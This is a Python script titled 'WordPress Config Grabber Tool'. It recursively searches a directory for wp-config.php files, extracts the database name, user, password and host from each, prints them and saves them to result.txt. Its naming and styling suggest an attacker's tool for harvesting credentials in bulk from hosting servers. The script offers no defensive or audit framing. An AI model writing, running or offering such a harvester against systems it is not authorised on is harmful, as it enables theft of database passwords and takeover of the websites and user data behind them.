#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Compatible with Python 2.7 and 3.x
# Coded by JavaX7 - Filtered Output Version (Only show valid DB configs)

from __future__ import print_function, unicode_literals
import os
import re
import sys
import argparse
import codecs

# === Python 2 Compatibility Layer ===
if sys.version_info[0] < 3:
    reload(sys)
    sys.setdefaultencoding('utf-8')

def find_wp_config_files(directory):
    """Recursively find all wp-config.php files in directory"""
    config_files = []
    for root, dirs, files in os.walk(directory):
        for filename in files:
            try:
                name = filename.decode('utf-8') if hasattr(filename, 'decode') else filename
            except:
                name = filename
            if name == u'wp-config.php':
                config_files.append(os.path.join(root, filename))
    return config_files

def extract_db_details(file_path):
    """Extract database details from wp-config.php file"""
    try:
        with codecs.open(file_path, 'r', encoding='utf-8', errors='replace') as f:
            content = f.read()

        pattern = r"define\(\s*['\"]DB_(NAME|USER|PASSWORD|HOST|CHARSET|COLLATE)['\"]\s*,\s*['\"](.*?)['\"]\s*\);"
        matches = re.findall(pattern, content)

        if not matches:
            return None  # Skip empty results

        details = [u"File: " + file_path]
        for match in matches:
            details.append(u"⚡( '" + match[0] + "', '" + match[1] + "' );")

        return u'\n'.join(details)

    except Exception as e:
        msg = unicode(e) if sys.version_info[0] < 3 else str(e)
        return u"Error reading file: " + msg

def main():
    parser = argparse.ArgumentParser(description='WordPress Config Grabber Tool')
    parser.add_argument('directory', help='Directory path to search for wp-config.php files')
    parser.add_argument('--output', '-o', default='result.txt',
                      help='Output file name (default: result.txt)')
    args = parser.parse_args()

    if not os.path.isdir(args.directory):
        print("Error: Invalid or non-existent directory - " + args.directory)
        return

    config_files = find_wp_config_files(args.directory)
    if not config_files:
        print("No wp-config.php files found in " + args.directory)
        return

    with codecs.open(args.output, 'w', encoding='utf-8') as out_file:
        print("\nDatabase Configurations Found in " + args.directory + ":")
        for config_file in config_files:
            db_details = extract_db_details(config_file)
            if not db_details:
                continue  # Skip files with no DB info
            try:
                print("\n" + db_details)
            except UnicodeEncodeError:
                print(("\n" + db_details).encode('utf-8'))
            out_file.write(db_details + "\n\n")

    print("\nResults saved in " + args.output)

if __name__ == "__main__":
    main()
